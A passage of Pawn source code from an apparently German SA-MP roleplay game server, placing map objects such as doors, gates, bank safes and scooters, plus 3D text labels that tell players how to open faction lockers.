	ARMYDOORZELLE[3] = CreateDynamicObjectEx(19302, 4517.12646, -8689.21973, 4.65460,   0.00000, 0.00000, 0.00000, 150.00, 150.00);
	ARMYDOORZELLE[4] = CreateDynamicObjectEx(19302, 4513.50342, -8689.21973, 8.51520,   0.00000, 0.00000, 0.00000, 150.00, 150.00);
	ARMYDOORZELLE[5] = CreateDynamicObjectEx(19302, 4509.88379, -8689.21973, 8.51520,   0.00000, 0.00000, 0.00000, 150.00, 150.00);
	ARMYDOORZELLE[6] = CreateDynamicObjectEx(19302, 4506.26758, -8689.21973, 8.51526,   0.00000, 0.00000, 0.00000, 150.00, 150.00);
	ARMYDOORZELLE[7] = CreateDynamicObjectEx(19302, 4502.64697, -8689.21973, 8.51520,   0.00000, 0.00000, 0.00000, 150.00, 150.00);
	ARMYDOORZELLE[8] = CreateDynamicObjectEx(19302, 4502.64697, -8689.21973, 4.65460,   0.00000, 0.00000, 0.00000, 150.00, 150.00);
	ARMYDOORZELLE[9] = CreateDynamicObjectEx(19302, 4506.26758, -8689.21973, 4.65460,   0.00000, 0.00000, 0.00000, 150.00, 150.00);
	//Armytüren
	ARMYDOOR[0] = CreateDynamicObjectEx(1569, 4547.50977, -8683.04590, 3.40910,   0.00000, 0.00000, 0.00000, 250.00, 250.00);
	ARMYDOOR[1] = CreateDynamicObjectEx(1569, 4541.05029, -8687.10352, 3.40910,   0.00000, 0.00000, 90.00000, 250.00, 250.00);
	ARMYDOOR[2] = CreateDynamicObjectEx(1569, 4533.02686, -8698.90918, 3.40910,   0.00000, 0.00000, 90.00000, 250.00, 250.00);
	ARMYDOOR[3] = CreateDynamicObjectEx(1569, 4503.48975, -8707.90137, 3.40910,   0.00000, 0.00000, 0.00000, 250.00, 250.00);

	HausInfo[0][hTuer] = CreateDynamicObjectEx(19859, 1765.36890, -9528.39941, 5.22420,   0.00000, 0.00000, 0.00000, 150.00, 150.00);//Haus 1
	HausInfo[0][hTuer2] = CreateDynamicObjectEx(19859, 1772.48669, -9517.02441, 5.22420,   0.00000, 0.00000, 0.00000, 150.00, 150.00);//Haus 1
	HausInfo[0][hTor] = CreateDynamicObjectEx(5043, 1774.17944, -9528.37305, 4.95580,   0.00000, 0.00000, 90.00000, 150.00, 150.00);//Haus 1
	HausInfo[0][hTorModel] = 5043;
	HausInfo[1][hTuer] = CreateDynamicObjectEx(19859, 1745.81885, -9517.02734, 5.22420,   0.00000, 0.00000, 0.00000, 150.00, 150.00);//Haus 2
	HausInfo[1][hTuer2] = CreateDynamicObjectEx(19859, 1738.7017, -9528.4054, 5.2242,   0.00000, 0.00000, 0.00000, 150.00, 150.00);//Haus 2
	HausInfo[1][hTor] = CreateDynamicObjectEx(5043, 1747.53467, -9528.37207, 5.17940,   0.00000, 0.00000, 90.00000, 150.00, 150.00);//Haus 2
    HausInfo[1][hTorModel] = 5043;
	HausInfo[2][hTuer] = CreateDynamicObjectEx(19859, 1719.15320, -9517.03418, 5.22420,   0.00000, 0.00000, 0.00000, 150.00, 150.00);//Haus 3
	HausInfo[2][hTuer2] = CreateDynamicObjectEx(19859, 1712.03540, -9528.41211, 5.22420,   0.00000, 0.00000, 0.00000, 150.00, 150.00);//Haus 3
	HausInfo[2][hTor] = CreateDynamicObjectEx(5043, 1720.78833, -9528.38281, 5.17940,   0.00000, 0.00000, 90.00000, 150.00, 150.00);//Haus 3
    HausInfo[2][hTorModel] = 5043;
	HausInfo[3][hTuer] = CreateDynamicObjectEx(19859, 1692.48523, -9517.03418, 5.22420,   0.00000, 0.00000, 0.00000, 150.00, 150.00);//Haus 4
	HausInfo[3][hTuer2] = CreateDynamicObjectEx(19859, 1685.36548, -9528.41113, 5.22420,   0.00000, 0.00000, 0.00000, 150.00, 150.00);//Haus 4
	HausInfo[3][hTor] = CreateDynamicObjectEx(5043, 1694.15552, -9528.38379, 5.17940,   0.00000, 0.00000, 90.00000, 150.00, 150.00);//Haus 4
    HausInfo[3][hTorModel] = 5043;
	HausInfo[4][hTor] = CreateDynamicObjectEx(5043, 1756.57202, -9459.79688, 5.17940,   0.00000, 0.00000, 270.00000, 150.00, 150.00);//Haus 5
	HausInfo[4][hTuer2] = CreateDynamicObjectEx(19859, 1757.00659, -9471.14160, 5.22420,   0.00000, 0.00000, 0.00000, 150.00, 150.00);//Haus 5
	HausInfo[4][hTuer] = CreateDynamicObjectEx(19859, 1764.13477, -9459.76758, 5.22420,   0.00000, 0.00000, 0.00000, 150.00, 150.00);//Haus 5
    HausInfo[4][hTorModel] = 5043;
	HausInfo[5][hTor] = CreateDynamicObjectEx(5043, 1729.86963, -9459.80566, 5.17940,   0.00000, 0.00000, 90.00000, 150.00, 150.00);//Haus 6
	HausInfo[5][hTuer2] = CreateDynamicObjectEx(19859, 1737.46423, -9459.76660, 5.22420,   0.00000, 0.00000, 0.00000, 150.00, 150.00);//Haus 6
	HausInfo[5][hTuer] = CreateDynamicObjectEx(19859, 1730.34094, -9471.14160, 5.22420,   0.00000, 0.00000, 0.00000, 150.00, 150.00);//Haus 6
    HausInfo[5][hTorModel] = 5043;
	HausInfo[6][hTuer] = CreateDynamicObjectEx(19859, 1703.67004, -9471.14258, 5.22420,   0.00000, 0.00000, 0.00000, 150.00, 150.00);//Haus 7
	HausInfo[6][hTuer2] = CreateDynamicObjectEx(19859, 1710.79883, -9459.76758, 5.22420,   0.00000, 0.00000, 0.00000, 150.00, 150.00);//Haus 7
	HausInfo[6][hTor] = CreateDynamicObjectEx(5043, 1703.27393, -9459.79590, 5.17940,   0.00000, 0.00000, 90.00000, 150.00, 150.00);//Haus 7
    HausInfo[6][hTorModel] = 5043;
	HausInfo[7][hTor] = CreateDynamicObjectEx(5043, 1676.61609, -9459.79492, 5.17940,   0.00000, 0.00000, 90.00000, 150.00, 150.00);//Haus 8
	HausInfo[7][hTuer2] = CreateDynamicObjectEx(19859, 1684.12976, -9459.76660, 5.22420,   0.00000, 0.00000, 0.00000, 150.00, 150.00);//Haus 8
	HausInfo[7][hTuer] = CreateDynamicObjectEx(19859, 1677.00635, -9471.14160, 5.22420,   0.00000, 0.00000, 0.00000, 150.00, 150.00);//Haus 8
    HausInfo[7][hTorModel] = 5043;
	HausInfo[8][hTuer] = CreateDynamicObjectEx(19859, 1561.16235, -9400.91016, 7.56690,   0.00000, 0.00000, 90.00000, 150.00, 150.00); //Villa 1 Tür 1
	HausInfo[8][hTuer2] = CreateDynamicObjectEx(19859, 1546.13757, -9389.74414, 7.56690,   0.00000, 0.00000, 90.00000, 150.00, 150.00);//Villa 1 Tür 2
	HausInfo[8][hTor] = CreateDynamicObjectEx(19861, 1568.69165, -9391.10449, 8.08210,   0.00000, 0.00000, 90.00000, 150.00, 150.00);//Villa 1 Garage
    HausInfo[8][hTorModel] = 19861;
	HausInfo[9][hTuer] = CreateDynamicObjectEx(19859, 1561.16235, -9354.63379, 7.56690,   0.00000, 0.00000, 90.00000, 150.00, 150.00);//Villa 2 Tür 1
	HausInfo[9][hTuer2] = CreateDynamicObjectEx(19859, 1546.13672, -9343.46777, 7.56690,   0.00000, 0.00000, 90.00000, 150.00, 150.00);//Villa 2 Tür 2
	HausInfo[9][hTor] = CreateDynamicObjectEx(19861, 1568.70264, -9344.82813, 8.08210,   0.00000, 0.00000, 90.00000, 150.00, 150.00);//Villa 2 Garage
    HausInfo[9][hTorModel] = 19861;
	HausInfo[10][hTor] = CreateDynamicObjectEx(19861, 1568.69397, -9313.61426, 8.08210,   0.00000, 0.00000, 90.00000, 150.00, 150.00);//Villa 3 Garage
	HausInfo[10][hTuer] = CreateDynamicObjectEx(19859, 1561.16052, -9323.41992, 7.56690,   0.00000, 0.00000, 90.00000, 250.00, 250.00);//Villa 3 Türe 1
	HausInfo[10][hTuer2] = CreateDynamicObjectEx(19859, 1546.13892, -9312.25879, 7.56690,   0.00000, 0.00000, 90.00000, 150.00, 150.00);//Villa 3 Türe 2
	HausInfo[10][hTorModel] = 19861;


	CreateDynamicObjectEx(12943, 1713.13855, -9318.42578, 3.42520,   0.00000, 0.00000, 180.00000, 150.00, 150.00);
	CreateDynamicObjectEx(12942, 1713.13770, -9318.42773, 3.42920,   0.00000, 0.00000, 180.00000, 150.00, 150.00);
	LSPDGate = CreateDynamicObjectEx(19451, 1576.12085, -9462.30273, 7.10650, 0.00000, 0.00000, 0.00000, 200.00, 200.00);
 	SetDynamicObjectMaterial(LSPDGate,0, 9239, "stuff2_sfn", "ws_corrugateddoor1", 0xFFFFFFFF);//GATE
    sfpdgate = CreateDynamicObjectEx(19451, 6541.88721, -7866.26270, 5.04716,   0.00000, 0.00000, 90.00000, 250.00, 250.00);//SFPD Gate
    SetDynamicObjectMaterial(sfpdgate,0, 9239, "stuff2_sfn", "ws_corrugateddoor1", 0xFFFFFFFF);//GATE
	for(new x = 0; x < sizeof(AdminVehicle); x++) AdminVehicle[x] = -1;
	///////////////  TORE    ///////////////////
    fwstor[0] = CreateDynamicObjectEx(10150, 6314.24365, -9361.02441, 4.90360,   180.00000, 0.00000, 180.00000, 250.00, 250.00);
	fwstor[1] = CreateDynamicObjectEx(10150, 6314.24512, -9353.61914, 4.90560,   180.00000, 0.00000, 180.00000, 250.00, 250.00);
	fwstor[2] = CreateDynamicObjectEx(10150, 6314.24414, -9346.21387, 4.90560,   180.00000, 0.00000, 180.00000, 250.00, 250.00);
	for(new i;i<sizeof fwstor;i++)
	{
 		SetDynamicObjectMaterial(fwstor[i],0, 3925, "weemap", "LoadingDoorClean", 0xFFFFFFFF);
	}
	for(new i = 0; i < MAX_AUTOMATEN; i++)
	{
	    CreateDynamicObjectEx(19324, BankAutomaten[i][0], BankAutomaten[i][1], BankAutomaten[i][2],   BankAutomaten[i][3], BankAutomaten[i][4], BankAutomaten[i][5], 150.00, 150.00);
        Create3DTextLabel("{FAFAFA}Benutze {FF5A00}'H'{FAFAFA} zum agieren",0xFFFFFF,BankAutomaten[i][0], BankAutomaten[i][1], BankAutomaten[i][2]+1,20.0,0,0);
	}
	FWTUER = CreateDynamicObject(19858, 6314.20361, -9365.45801, 4.65700,   0.00000, 0.00000, 90.00000);
	CreateDynamicObjectEx(16304, 4295.02930, -8526.77344, 8.04761,   0.00000, 0.00000, 0.00000, 350.00, 350.00);
	CreateDynamicObjectEx(16304, 4226.42285, -8529.09961, 8.04761,   0.00000, 0.00000, 0.00000, 350.00, 350.00);
	PDDOOR[0] = CreateDynamicObjectEx(19859, 6496.19287, -7875.83252, 4.85930,   0.00000, 0.00000, 0.00000, 150.00, 150.00);
	PDDOOR[1] = CreateDynamicObjectEx(19802, 6507.98242, -7875.89600, 3.60500,   0.00000, 0.00000, 0.00000, 150.00, 150.00);
	PDDOOR[2] = CreateDynamicObjectEx(19802, 6521.82471, -7880.61230, 3.60500,   0.00000, 0.00000, 90.00000, 150.00, 150.00);
	PDDOOR[3] = CreateDynamicObjectEx(19802, 6503.71777, -7887.83350, 3.60500,   0.00000, 0.00000, 90.00000, 150.00, 150.00);
	PDDOOR[4] = CreateDynamicObjectEx(19859, 6524.54248, -7883.82813, 4.85720,   0.00000, 0.00000, 90.00000, 150.00, 150.00);

	LSMDDOORS[0] = CreateDynamicObjectEx(19858, 1731.95764, -9324.08398, 4.65540,   0.00000, 0.00000, 0.00000, 150.00, 150.00);//MedicTürLS
	LSMDDOORS[1] = CreateDynamicObjectEx(19859, 1760.2711, -9315.1689, 4.6494,   0.00000, 0.00000, -90.00000, 150.00, 150.00);//DESDA

	LSDOOR[0] = CreateDynamicObjectEx(19859, 1564.23975, -9499.00488, 7.40710,   0.00000, 0.00000, 0.00000,150.00, 150.00);//LSPDTür
    LSDOOR[1] = CreateDynamicObjectEx(19859, 1561.03296, -9499.00195, 7.40710,   0.00000, 0.00000, 0.00000,150.00, 150.00);//LSPDTür
    LSDOOR[2] = CreateDynamicObjectEx(19859, 1548.16345, -9518.03027, 7.40710,   0.00000, 0.00000, 0.00000,150.00, 150.00);//LSPDTür
    LSDOOR[3] = CreateDynamicObjectEx(19859, 1553.17407, -9476.69043, 7.40710,   0.00000, 0.00000, 0.00000,150.00, 150.00);//LSPDTÜR
    LSDOOR[4] = CreateDynamicObjectEx(19859, 1545.06555, -9520.18066, 7.40710,   0.00000, 0.00000, 90.00000,150.00, 150.00);

   	LSFDDOORS[0] = CreateDynamicObjectEx(19858, 1771.95203, -9365.70508, 4.65540,   0.00000, 0.00000, 90.00000,150.00, 150.00);//FeuerwehrTürLS
	LSFDDOORS[1] = CreateDynamicObjectEx(19858, 1754.57520, -9327.43164, 4.65540,   0.00000, 0.00000, 90.00000,150.00, 150.00);//FeuerwehrTürLS

	BALLASDOORS[0] = CreateDynamicObjectEx(1498, 1716.86597, -8839.92871, 4.19080,   0.00000, 0.00000, 180.00000, 150.00, 150.00);
	BALLASDOORS[1] = CreateDynamicObjectEx(1498, 1711.59790, -8851.22656, 4.19080,   0.00000, 0.00000, 90.00000, 150.00, 150.00);

	BIKERDOOR[0] = CreateDynamicObjectEx(1536, 3725.53125, -9330.16016, 8.73700,   0.00000, 0.00000, 0.00000, 250.00, 250.00);
	BIKERDOOR[1] = CreateDynamicObjectEx(1536, 3728.66895, -9341.71191, 8.73700,   0.00000, 0.00000, 0.00000, 150.00, 150.00);


	VAGOSDOOR[0] = CreateDynamicObjectEx(19857, 6351.84619, -9127.93457, 6.49810,   0.00000, 0.00000, -90.00000, 150.00, 150.00);
	VAGOSDOOR[1] = CreateDynamicObjectEx(19857, 6365.81738, -9129.92969, 6.49810,   0.00000, 0.00000, -90.00000, 150.00, 150.00);

	GROVEDOORS[0] = CreateDynamicObjectEx(19857, 4413.70361, -7623.80811, 7.43700,   0.00000, 0.00000, 90.00000, 150.00, 150.00);//grovedoor

	ATZECASDOORS[0] = CreateDynamicObjectEx(19857, 4223.10498, -7633.65186, 5.96790,   0.00000, 0.00000, 0.00000, 150.00, 150.00);//ATZEDOOR
	ATZECASDOORS[1] = CreateDynamicObjectEx(19857, 4219.22119, -7644.98340, 5.95590,   0.00000, 0.00000, 90.00000, 150.00, 150.00);//ATZEDOOR

	YakuzaTORE[0] = CreateDynamicObjectEx(6400, 3167.99097, -9242.69434, 6.20256,   0.00000, 0.00000, 90.00000, 150.00, 150.00);//Yakuza Door
	YakuzaTORE[1] = CreateDynamicObjectEx(6400, 3170.25562, -9230.79395, 4.9138,   0.00000, 0.00000, 90.00000, 150.00, 150.00);//Yakuza Door
	YakuzaTORE[2] = CreateDynamicObjectEx(6400, 3165.64746, -9230.79395, 4.69560,   0.00000, 0.00000, 90.00000, 150.00, 150.00);//Yakuza Door

	LCNTORE[0] = CreateDynamicObjectEx(11102, 6352.10449, -9311.16211, 5.59747,   0.00000, 0.00000, 0.00000, 150.00, 150.00);//RolloRussiaMafia
	LCNTORE[1] = CreateDynamicObjectEx(11102, 6345.61426, -9327.54492, 5.59750,   0.00000, 0.00000, 90.00000, 150.00, 150.00);//RolloRussiaMafia
	LCNDOORS[0] = CreateDynamicObjectEx(2949, 6370.76416, -9327.43164, 3.39850,   0.00000, 0.00000, -90.00000, 150.00, 150.00);//TürRussiaMafiaLCN


    PDZELLE[0] = CreateDynamicObjectEx(19303, 1563.81885, -9483.07617, 7.40330,   0.00000, 0.00000, 180.00000,150.00, 150.00);//Tür3 Zu
    PDZELLE[1] = CreateDynamicObjectEx(19303, 1560.14148, -9483.07617, 7.40330,   0.00000, 0.00000, 180.00000,150.00, 150.00);//Tür2 Zu
    PDZELLE[2] = CreateDynamicObjectEx(19303, 1556.46240, -9483.07422, 7.40330,   0.00000, 0.00000, 180.00000,150.00, 150.00);//Tür1 Zu
    PDZELLE[3] = CreateDynamicObjectEx(19303, 6495.51611, -7887.85840, 4.86880,   0.00000, 0.00000, 90.00000,150.00, 150.00);//Tür2Zu
    PDZELLE[4] = CreateDynamicObjectEx(19303, 6495.51611, -7884.18896, 4.86880,   0.00000, 0.00000, 90.00000,150.00, 150.00);//Tür3Zu
    PDZELLE[5] = CreateDynamicObjectEx(19303, 6495.51611, -7891.53516, 4.86880,   0.00000, 0.00000, 90.00000,150.00, 150.00);//Tür1Zu

	MEDICDOOR[0] = CreateDynamicObjectEx(19859, 6454.23828, -7760.33838, 4.54820,   0.00000, 0.00000, 0.00000,150.00, 150.00);
	MEDICDOOR[1] = CreateDynamicObjectEx(19859, 6460.18311, -7728.94775, 4.54820,   0.00000, 0.00000, 0.00000,150.00, 150.00);
	//medictore
	sfmedictore[0] = CreateDynamicObjectEx(10150, 6452.29492, -7742.89600, 5.37230,   0.00000, 180.00000, 0.00000,150.00, 150.00);
	sfmedictore[1] = CreateDynamicObjectEx(10150, 6452.29492, -7748.09863, 5.37230,   0.00000, 180.00000, 0.00000,150.00, 150.00);
	sfmedictore[2] = CreateDynamicObjectEx(10150, 6449.11035, -7751.27539, 5.37230,   0.00000, 180.00000, 90.00000,150.00, 150.00);
	sfmedictore[3] = CreateDynamicObjectEx(10150, 6443.91113, -7751.27539, 5.37230,   0.00000, 180.00000, 90.00000,150.00, 150.00);
	sfmedictore[4] = CreateDynamicObjectEx(10150, 6452.29492, -7737.71826, 5.37230,   0.00000, 180.00000, 0.00000,150.00, 150.00);

	SetDynamicObjectMaterial(sfmedictore[0],0, 6056, "firehouse_sfse","ws_rollerdoor_fire", 0xFFFFFFFF);
	SetDynamicObjectMaterial(sfmedictore[1],0, 11008,"firehouse_sfse","ws_rollerdoor_fire", 0xFFFFFFFF);
	SetDynamicObjectMaterial(sfmedictore[4],0, 11008,"firehouse_sfse","ws_rollerdoor_fire", 0xFFFFFFFF);
	SetDynamicObjectMaterial(sfmedictore[2],0, 6056, "venice_law", "garagedoor5_law", 0);
	SetDynamicObjectMaterial(sfmedictore[3],0, 6056, "venice_law", "garagedoor5_law", 0);
	
	

	Bankfach[0][0] = CreateDynamicObjectEx(2000, 6428.37158, -7749.42041, 3.36000,   0.00000, 0.00000, -90.00000, 50.00, 50.00);
	Bankfach[1][0] = CreateDynamicObjectEx(2000, 6428.33789, -7747.32910, 3.36000,   0.00000, 0.00000, -90.00000, 50.00, 50.00);
	Bankfach[2][0] = CreateDynamicObjectEx(2000, 6428.39111, -7751.47559, 3.36000,   0.00000, 0.00000, -90.00000, 50.00, 50.00);
	Bankfach[3][0] = CreateDynamicObjectEx(2000, 6428.32568, -7753.95801, 3.36000,   0.00000, 0.00000, -90.00000, 50.00, 50.00);
	Bankfach[4][0] = CreateDynamicObjectEx(2000, 6423.73926, -7758.58740, 3.36000,   0.00000, 0.00000, 180.00000, 50.00, 50.00);
	Bankfach[5][0] = CreateDynamicObjectEx(2000, 6421.29150, -7758.59082, 3.36000,   0.00000, 0.00000, 180.00000, 50.00, 50.00);
	Bankfach[6][0] = CreateDynamicObjectEx(2000, 6420.06738, -7753.02539, 3.36000,   0.00000, 0.00000, 90.00000, 50.00, 50.00);
	Bankfach[7][0] = CreateDynamicObjectEx(2000, 6420.08252, -7749.92236, 3.36000,   0.00000, 0.00000, 90.00000, 50.00, 50.00);
	Bankfach[8][0] = CreateDynamicObjectEx(2000, 6420.07617, -7746.93799, 3.36000,   0.00000, 0.00000, 90.00000, 50.00, 50.00);
	Bankfach[9][0] = CreateDynamicObjectEx(2000, 1585.36035, -8551.18066, 1.12250,   0.00000, 0.00000, 0.00000, 50.00, 50.00);
	Bankfach[10][0] = CreateDynamicObjectEx(2000, 1583.07544, -8551.17480, 1.12250,   0.00000, 0.00000, 0.00000, 50.00, 50.00);
	Bankfach[11][0] = CreateDynamicObjectEx(2000, 1591.98779, -8553.59180, 1.12250,   0.00000, 0.00000, -90.00000, 50.00, 50.00);
	Bankfach[12][0] = CreateDynamicObjectEx(2000, 1592.01184, -8555.66211, 1.12250,   0.00000, 0.00000, -90.00000, 50.00, 50.00);
	Bankfach[13][0] = CreateDynamicObjectEx(2000, 1591.98816, -8558.62891, 1.12250,   0.00000, 0.00000, -90.00000, 50.00, 50.00);
	Bankfach[14][0] = CreateDynamicObjectEx(2000, 1591.99902, -8561.54395, 1.12250,   0.00000, 0.00000, -90.00000, 50.00, 50.00);

	Banktuer = CreateObject(19799, 6419.48340, -7755.87500, 4.84720,   0.00000, 0.00000, 90.00000); //geschlossen Tür1
	sftor = CreateDynamicObjectEx(19863, 6505.8643, -8018.2754, 2.2655,   0.00000, 0.00000, 0.00000, 150.00, 150.00);//TorBank
	Banktuerls = CreateObject(19799, 1590.65271, -8550.65918, 2.60410,   0.00000, 0.00000, 0.00000);
	armyhacktor = CreateObject(19863, 4346.05273, -8817.67773, 5.84800,   0.00000, 0.00000, 0.00000);

	armytor[0] = CreateDynamicObjectEx(19313, 4496.48438, -8630.79688, 6.74720,   0.00000, 0.00000, 0.00000, 350.00, 350.00);
	armytor[1] = CreateDynamicObjectEx(19313, 4647.25635, -8750.83398, 6.74720,   0.00000, 0.00000, 90.00000, 250.00, 250.00);//Tor
	//MEdictore
	medictorls[0] = CreateDynamicObjectEx(10150, 1731.19287, -9314.26758, 4.90920,   0.00000, 180.00000, -90.00000, 200.00, 200.00);
	medictorls[1] = CreateDynamicObjectEx(10150, 1736.99756, -9314.26758, 4.90920,   0.00000, 180.00000, -90.00000, 200.00, 200.00);
	medictorls[2] = CreateDynamicObjectEx(10150, 1725.39087, -9314.26758, 4.90920,   0.00000, 180.00000, -90.00000, 200.00, 200.00);
	medictorls[3] = CreateDynamicObjectEx(10150, 1748.5944, -9314.2676, 4.9092,   0.00000, 180.00000, -90.00000, 200.00, 200.00);
	medictorls[4] = CreateDynamicObjectEx(10150, 1742.79150, -9314.26758, 4.90920,   0.00000, 180.00000, -90.00000, 200.00, 200.00);
	for(new i;i<sizeof medictorls;i++)
	{
 		SetDynamicObjectMaterial(medictorls[i],0, 6056, "venice_law", "garagedoor5_law", 0xFFFFFFFF);
	}
	    //Autohausboden
	CreateDynamicObjectEx(19538, 6574.06006, -7815.61035, 3.40960,   0.00000, 0.00000, 0.00000, 500.00, 500.00);
	///////////////////////////////////////////////////////////////////////////////////////////////////////////
	//OBJECTE ZUM AUSFÜHREN TORE
    CreateDynamicObjectEx(11729, 6458.79980, -7759.93408, 3.37200,   0.00000, 0.00000, 180.00000, 50.00, 50.00);//MEDIC SPIND SF

	CreateDynamicObjectEx(11729, 1759.99402, -9366.12305, 3.41210,   0.00000, 0.00000, 180.00000, 50.00, 50.00);//LS Spind Fire
	//Feuerwehr LS Tore
	LSFWTORE[0] = CreateDynamicObjectEx(10150, 1771.93213, -9361.27734, 4.90920,   0.00000, 180.00000, 0.00000, 200.00, 200.00);
	LSFWTORE[1] = CreateDynamicObjectEx(10150, 1771.93213, -9355.47852, 4.90920,   0.00000, 180.00000, 0.00000, 200.00, 200.00);
	LSFWTORE[2] = CreateDynamicObjectEx(10150, 1771.93213, -9349.71777, 4.90920,   0.00000, 180.00000, 0.00000, 200.00, 200.00);
	LSFWTORE[3] = CreateDynamicObjectEx(10150, 1771.93213, -9332.37988, 4.90920,   0.00000, 180.00000, 0.00000, 200.00, 200.00);
	LSFWTORE[4] = CreateDynamicObjectEx(10150, 1771.93213, -9338.16992, 4.90920,   0.00000, 180.00000, 0.00000, 200.00, 200.00);
	LSFWTORE[5] = CreateDynamicObjectEx(10150, 1771.93213, -9343.93066, 4.90920,   0.00000, 180.00000, 0.00000, 200.00, 200.00);

	Buhne[0] = CreateDynamicObjectEx(19872, 1673.34985, -9323.97754, 1.79110,   0.00000, 0.00000, 0.00000, 50.00, 50.00);
	Buhne[1] = CreateDynamicObjectEx(19872, 1664.53040, -9323.97754, 1.79110,   0.00000, 0.00000, 0.00000, 50.00, 50.00);

	Towingdoor[0] = CreateDynamicObjectEx(19906, 1691.48547, -9316.44727, 6.81520,   0.00000, 0.00000, 0.00000, 150.00, 150.00);
	Towingdoor[1] = CreateDynamicObjectEx(19906, 1682.48596, -9316.44727, 6.81520,   0.00000, 0.00000, 0.00000, 150.00, 150.00);
	Towingdoor[2] = CreateDynamicObjectEx(19906, 1673.48523, -9316.44727, 6.81120,   0.00000, 0.00000, 0.00000, 150.00, 150.00);
	Towingdoor[3] = CreateDynamicObjectEx(19906, 1664.48816, -9316.44727, 6.81120,   0.00000, 0.00000, 0.00000, 150.00, 150.00);

	for(new i;i<sizeof LSFWTORE;i++)
	{
 		SetDynamicObjectMaterial(LSFWTORE[i],0, 11008,"firehouse_sfse","ws_rollerdoor_fire", 0);
	}

//Roller
	Rollernew[0] = AddStaticVehicleEx(462,1605.9310,-8524.5596,1.7265,268.3388,-1,-1,1000);
	Rollernew[1] = AddStaticVehicleEx(462,1605.9701,-8523.3018,1.7272,270.0526,-1,-1,1000);
	Rollernew[2] = AddStaticVehicleEx(462,1838.7723,-9259.2148,4.0135,115.8845,-1,-1,1000);
	Rollernew[3] = AddStaticVehicleEx(462,1839.0021,-9261.5547,4.0146,121.1980,-1,-1,1000); 
	Rollernew[4] = AddStaticVehicleEx(462,1839.0205,-9263.6055,4.0121,131.7250,-1,-1,1000);
	Rollernew[5] = AddStaticVehicleEx(462,1838.5481,-9266.2158,4.0108,128.2914,-1,-1,1000); 
	Rollernew[6] = AddStaticVehicleEx(462,1838.4286,-9268.4023,4.0119,134.4113,-1,-1,1000); 
	Rollernew[7] = AddStaticVehicleEx(462,6377.9473,-7725.1382,3.9731,216.8584,-1,-1,1000);
	Rollernew[8] = AddStaticVehicleEx(462,6366.4321,-7723.9761,3.9711,207.3873,-1,-1,1000);
	Rollernew[9] = AddStaticVehicleEx(462,6368.8384,-7724.1611,3.9757,213.1593,-1,-1,1000);
	Rollernew[10] = AddStaticVehicleEx(462,6371.0874,-7724.3765,3.9757,217.0171,-1,-1,1000); 
	Rollernew[11] = AddStaticVehicleEx(462,6373.5562,-7724.8975,3.9698,215.3312,-1,-1,1000); 
	Rollernew[12] = AddStaticVehicleEx(462,6375.2754,-7724.9023,3.9756,214.3618,-1,-1,1000); 
	Rollernew[13] = AddStaticVehicleEx(462,1839.1783,-9270.5117,4.0122,135.6963,-1,-1,1000);
	Rollernew[14] = AddStaticVehicleEx(462,1605.9221,-8521.7910,1.7276,266.3425,-1,-1,1000); 
	Rollernew[15] = AddStaticVehicleEx(462,1605.8516,-8520.1494,1.7248,270.0132,-1,-1,1000);
	Rollernew[16] = AddStaticVehicleEx(462,1833.6311,-9289.3779,4.0116,29.1795,-1,-1,1000);
	Rollernew[17] = AddStaticVehicleEx(462,1835.8481,-9289.3828,4.0117,24.7234,-1,-1,1000); 
	Rollernew[18] = AddStaticVehicleEx(462,1837.7406,-9289.2598,4.0115,33.2390,-1,-1,1000);  
	Rollernew[19] = AddStaticVehicleEx(448,6602.5728,-7871.4111,4.0082,14.2444,6,6,1000); 
	Rollernew[20] = AddStaticVehicleEx(448,6600.4170,-7871.6396,4.0068,15.7714,6,6,1000); 
	Create3DTextLabel("Benutze /freikaufen um Privatfahrzeuge freizukaufen.",COLOR_ORANGE,3854.4077,-861.7031,11.2172,20,0,0);
	Create3DTextLabel("{FAFAFA}Benutze {FF5A00}'H'{FAFAFA} um den Crack Spind der Ballas zu öffnen", -1, 1717.2190, -8846.1152, 4.1954, 7, 0); //Ballas Spind
	Create3DTextLabel("{FAFAFA}Benutze {FF5A00}'H'{FAFAFA} um den Crack Spind der Atzecas zu öffnen", -1, 4225.0386, -7637.5767, 4.7135, 7, 0); //Atzecas
	Create3DTextLabel("{FAFAFA}Benutze {FF5A00}'H'{FAFAFA} um den Crack Spind der Vagos zu öffnen", -1, 6358.0835, -9122.0693, 5.4943, 7, 0); //Vagos
	Create3DTextLabel("{FAFAFA}Benutze {FF5A00}'H'{FAFAFA} um den Crack Spind der Mayans MC zu öffnen", -1, 3739.3452, -9336.2178, 8.7841, 7, 0); //Mayans MC
	Create3DTextLabel("{FAFAFA}Benutze {FF5A00}'H'{FAFAFA} um den Crack Spind der Grove Street zu öffnen", -1, 4424.9858, -7622.8013, 6.1866, 7, 0); //GroveStreet
	Create3DTextLabel("{FAFAFA}Benutze {FF5A00}'H'{FAFAFA} um den Spind der Yakuza zu öffnen", -1, 3165.5588, -9242.1621, 4.8591, 7, 0); //Yakuza
	Create3DTextLabel("{FAFAFA}Benutze {FF5A00}'H'{FAFAFA} um den Spind der LCN zu öffnen", -1, 6371.1455, -9356.5811, 3.4988, 7, 0); //LCN
	Create3DTextLabel("{FAFAFA}Benutze {FF5A00}'H'{FAFAFA} um den Werkzeugschrank zu öffnen", -1, 1668.2385, -9331.2881, 4.4866, 7, 0); //Werkzeugschrank LS
	Create3DTextLabel("{FAFAFA}Benutze {FF5A00}'H'{FAFAFA} um den Spind zu öffnen", -1, 1759.99402, -9366.12305, 4.61210, 7, 0); //FIRE LS Spind
	Create3DTextLabel("{FAFAFA}Benutze {FF5A00}'H'{FAFAFA} um den Spind zu öffnen", -1, 6458.79980, -7759.93408, 4.67200, 7, 0); //MEDIC SF Spind
	Create3DTextLabel("{FAFAFA}Benutze {FF5A00}'H'{FAFAFA} um den Spind zu öffnen", -1, 1550.0718, -9504.5195, 8.1554, 7, 0); //LSPD Spind
	Create3DTextLabel("{FAFAFA}Benutze {FF5A00}'H'{FAFAFA} um den Spind zu öffnen", -1, 6512.0952,-7891.4507,4.6166, 7, 0); //SFPD Spind
	Create3DTextLabel("{FAFAFA}Benutze {FF5A00}'H'{FAFAFA} um den Spind zu öffnen", -1, 4577.0483, -8699.8193, 3.5964, 7, 0); //Army Spind
	Create3DTextLabel("{FAFAFA}Benutze {FF5A00}'H'{FAFAFA} um das PNS Menü zu öffnen", -1, 1713.1389,-9318.3789,4.4370, 10, 0); //PNS
	Create3DTextLabel("{FAFAFA}Benutze {FF5A00}'H'{FAFAFA} um das PNS Menü zu öffnen", -1, 6428.7695,-7830.9756,4.3785, 10, 0); //PNS
